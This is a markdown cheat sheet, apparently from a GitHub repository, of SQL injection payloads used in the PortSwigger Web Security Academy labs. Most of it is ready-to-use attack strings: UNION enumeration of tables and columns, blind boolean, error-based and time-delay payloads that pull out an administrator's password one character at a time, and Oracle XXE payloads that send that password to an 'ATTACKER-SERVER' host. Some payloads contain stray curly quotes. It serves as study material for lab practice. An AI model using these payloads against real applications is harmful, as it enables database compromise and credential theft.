# SQL Injection 

## Summary

* [Recon for SQLi Vulnerabilities](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

    * [Identification Payloads](#identification-payloads)

    * [Examples](#examples)

    * [Exploitation Payloads](#exploitation-payloads)

        * [SQLi UNION Technique Example](#sqli-union-technique-example)

        * [SQLi Blind Conditional Responses Examples](#sqli-blind-conditional-responses-examples)

        * [SQLi Blind Conditional Errors Examples](#sqli-blind-conditional-errors-examples)

        * [SQLi Blind Time Delays Examples](#sqli-blind-time-delays-examples)

        * [SQLi Out of Band Interaction](#sqli-out-of-band-interaction)

<br>

## Recon

### How to Identify Vulnerability

* The first step is to identify when the application is interacting with a backend database.  Make a list of all input fields from the application that are potentially being used to create an SQL query and test each one of those fields separately.

* After mapping out the application, the next steps will be to include specific SQL payloads to identify if the input fields are vulnerable to SQL injection.  Some of those payloads can be:

* Submit a single/double quote characters and look for errors or anomalies:

    * '  
    
    * ''  
    
    * '--   
    
    * '#

* Submit SQL syntax that evaluates to the original value of the entry point, and a different value. Look for differences in application's response.  

    * Example:  String concatenation
    
        * ?parameter1=Accessorie'||'s           
        * ?parameter1 =Accessorie'||'wrongvalue 

* Submit Boolean conditions and look for differences in the application's responses:
    * ' or 1=1       
    * ' or 1=2       
    * ' and '1'='1    

* Submit payloads that will trigger time delays and look for differences in the time it takes for the application to respond:

     * ; select pg_sleep(10)    

* Try using  out-of-band exploitation techniques if none of the other techniques work (error-based, conditional-based, time-delays, union)

---
---
<br>

## Cheat Sheet

**Depending on the database type, these payloads may be different.**

* https://portswigger.net/web-security/sql-injection/cheat-sheet
    
* https://pentestmonkey.net/cheat-sheet


<br>

### Identification Payloads

* Submit the following payload in the input fields and identify if there is any error messages or a notable difference from the original response:

    * '

* Submit the following payloads in the input fields.  If there was an error message with the previous payload^, identify if it has gone away (these 2 payloads below, are meant to "fix" the current query statement to prevent any exceptions from occurring) or if there are any notable differences from original response:

    * '--

    * ''


* Submit the following payloads in the input fields.  Identify if there is a notable difference from the original response.  The (1=1) is equal to True, so the response size for these ones are usually larger than the (1=2) payload as that is equal to False.

    * ' or 1=1--

    * ' or '1'='1

    * ' or 1=2--

    * ' or '1'='2


<br>

#### Conditional Payloads


* Submit the following payloads in the input fields.  Identify if there is a notable difference in the responses from (1=1) and (1=2).  The key here is to determine how the application responds with True vs False statements. 

* **Example scenario:** If the original response and the response from (1=1) payload are the **same** but when injecting the (1=2) payload there's a **difference** comparing to the original response, then the field may be susceptible to SQLi. 

    * ' and 1=1--

    * ' and '1'='1

    * ' and 1=2--

    * ' and '1'='2


<br>

#### String Concatenation

* Another technique we can use to identify SQLi, is String Concatenation: 

1. The original parameter/value:

    * ?category=Gifts

1. Use String Concatenation that will resolve to the original value:

    * ?category=Gift'||'s

1. Use String Concatenation that will not resolve to the original value:

    * ?category=Gift'||'sss


* If the 1st and 2nd payloads result in the same response, but the 1st and 3rd don't, then the field may be vulnerable to SQLi.


**Sometimes our injected input may be reflected in the response.  So, the response size may differ slightly even if they return the same data.**

<br>

#### Time-Delay Payloads

* We can also inject Time-Delay payloads in the input fields.  If the application has a notable delay in its response from the normal time, then the input field may be vulnerable to SQLi:

    * PostgreSQL:
    
        * ; select pg_sleep(10)--

    * Oracle DB:
        
        * '||(select dbms_pipe.receive_message(('a'),10) from dual)||'

    * MySQL:
    
        * ;select sleep(10)--


<br>

#### Out of Band Techniques

* [Payloads](#sqli-out-of-band-interaction)



<br><br><br><br>

### Examples

![SQL-1](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/SQL%20Injection/Images/sqli-1.png)

<br><br>

![SQL-2](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/SQL%20Injection/Images/sqli-2.png)

<br><br>

![SQL-3](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/SQL%20Injection/Images/sqli-3.png)

<br><br>

![SQL-4](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/SQL%20Injection/Images/sqli-4.png)

<br><br>

![SQL-5](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/SQL%20Injection/Images/sqli-5.png)

<br><br><br><br>


**This next section contains the specific techniques/payloads that were used in the labs, to extract sensitive information from the databases.**

<br>

### Exploitation Payloads

<br>

#### SQLi UNION Technique Example

* This technique works if the results of the query are being returned in the response, if not Blind techniques will have to be used.


* First, we need to determine how the application responds to a valid vs invalid query.  With this information we will be able to determine whether our injected payloads are valid or invalid.

<br>

1. **Determine how many columns are in the original query.**  The number of "nulls" injected needs to be adjusted:

```
' union select null, null--
```

2. **Determine which of those columns return String data:**

```
' union select 'Test', null--
```


3. **Extract table names from the database:**

```
' union select table_name, null from information_schema.tables--
```


4. **Extract column names from those tables:**

```
' union select null,column_name from information_schema.columns where table_name = 'users'--
```


<br><br>

#### SQLi Blind Conditional Responses Examples

* Identify if the below payloads result in a notable difference in the responses.  The key here is to know how the application responds to a true statement (1=1) vs a false statement (1=2):

    * ' and '1'='1

    * ' and '1'='2

    * ' and 1=1--

    * ' and 1=2--


* Once we can identify how the application responds to a True vs False query, we can use the below payloads to extract useful information.  Depending on the response we receive, we know that the query injected is either valid or invalid.

<br>

* **Payloads to enumerate table names.**  Even though UNION attacks won't do us any good here in Blind SQLi, this technique can still be used to enumerate table names:

```
'and (select 'a' from {tableName} limit 1)='a
```
```
'union select 'a' from {tableName} where 1=1--
```


* **Payloads to enumerate column names.**  The 2nd payload requires to know at least 1 username on the database:

```
'union select {columnName} from users where 1=1--
```
```
'union select 'a' from users where {columnName}='administrator'--
```



* **Payloads to enumerate valid users that are in a column called username:**

```
'and (select 'a' from users where username='{userName}')='a
```


* **Payloads to determine the length of a user's password.  This payload uses a table called users and 2 columns called username and password:**

```
' and (select 'a' from users where username='administrator' and length(password)>10)='a
```


* **Payloads to extract the password of a user 1 character at a time:**

```
' and (select substring(password,1,1) from users where username='administrator')='{character}
```


<br><br>

#### SQLi Blind Conditional Errors Examples


* Identify if the following 2 payloads result in a notable difference in the responses from the application:


    * ' and 1=1--

    * ' and 1=0--


* Identify if the below payloads cause an SQL exception or error message.  Dividing by zero may cause an exception:


    * ' and to_char(1/1)=1--

    * ' and to_char(1/0)=1--

<br>

* **Payloads to enumerate table names:**

```
'||(select '' from {tableName} where rownum = 1)||'
```
```
'union select 'a' from {tableName} where 1=1--
```


* **Payloads to determine if there is a user named administrator on the table called users.**  If the <u>user exists</u>, then an error (1/0) will result.  Basically, if the <u>query is valid</u> then an exception will occur, if it is <u>not valid</u> then the '' will be executed:

```
'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
```



* **Payloads to determine the length of the password for a user called administrator.**  If the password is greater than 20 characters, then an error (1/0) will result:

```
'||(select case when length(password)>20 then to_char(1/0) else '' end from users where username='administrator')||'
```


* **Extract the password of a user.**  For both payloads, if the character in the current position is correct, then the error (1/0) will execute:


    * Oracle DB:
    
```
'||(select case when(substr((select password from users where username='administrator'),1,1)='z') then to_char(1/0) else '' end from dual)||'
```

```
'||(select case when substr(password,1,1)='z' then to_char(1/0) else '' end from users where username = 'administrator')||'
```


<br><br>

#### SQLi Blind Time Delays Examples

* Encode:

    * ;   ->   %3b


* Identify if any of the below payloads cause a time delay on the application's response.  Portswigger has a cheat sheet that has more:


    * '||(select dbms_pipe.receive_message(('a'),10) from dual)||'


    * '%3b select sleep(10)--


    * '%3b select pg_sleep(10)--


<br>

* **Payload to enumerate valid tables in the database.**  In this example if the <u>table users does exist</u> then the application will sleep, if it doesn't exist then the application should respond normally:

```
'%3b select case when (1=1) then pg_sleep(10) else null end from users-- 
```


* **Payloads to identify if a user called administrator exists on the table called users:**

```
'%3b select case when (username='administrator’) then pg_sleep(10) else pg_sleep(0) end from users--
```
```
'%3b select case when ((select 'TEST’ from users where username='administrator')='TEST') then pg_sleep(10) else null end--
```



* **Identify the length of the password for a user called administrator:**

```
'%3b select case when (username='administrator’ and length(password)>1) then pg_sleep(10) else pg_sleep(0) end from users--
```
```
'%3b select case when ((select 'TEST’ from users where username='administrator' and length(password)>10)='TEST') then pg_sleep(10) else null end--
```




* **Extract the password from a user called administrator.**  The columns here are username and password.  The table is users.:

```
'%3b select case when (username='administrator’ and substring(password,1,1)='a’) then pg_sleep(10) else pg_sleep(0) end from users--
```
```
'%3b select case when (substring((select password from users where username ='administrator'),1,1)='f') then pg_sleep(10) else null end--
```



<br><br>

#### SQLi Out of Band Interaction

* **Example:  Out of Band Interaction**

* https://portswigger.net/web-security/sql-injection/cheat-sheet#dns-lookup

* Here we are using a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly).


* An XXE payload using a parameter entity called remote is used, that will reach out to our attacker server.

    * Oracle DB:

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
```




```
' UNION SELECT extractvalue(
xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER/"> %remote;]>
')
,'/1') 
FROM dual--
```

<br>

* **Example:  Out of Band Data Exfiltration**

* Here we are using a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly).


* An XXE payload using a parameter entity called remote is used, that will reach out to our attacker server.  The application will evaluate the SQL query before the XXE payload is executed.


    * Oracle DB:


```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ATTACKER-SERVER/">+%25remote%3b]>'),'/l')+FROM+dual--
```



```
' UNION SELECT extractvalue(
xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.ATTACKER-SERVER/"> %remote;]>
')
,'/1') 
FROM dual--
```
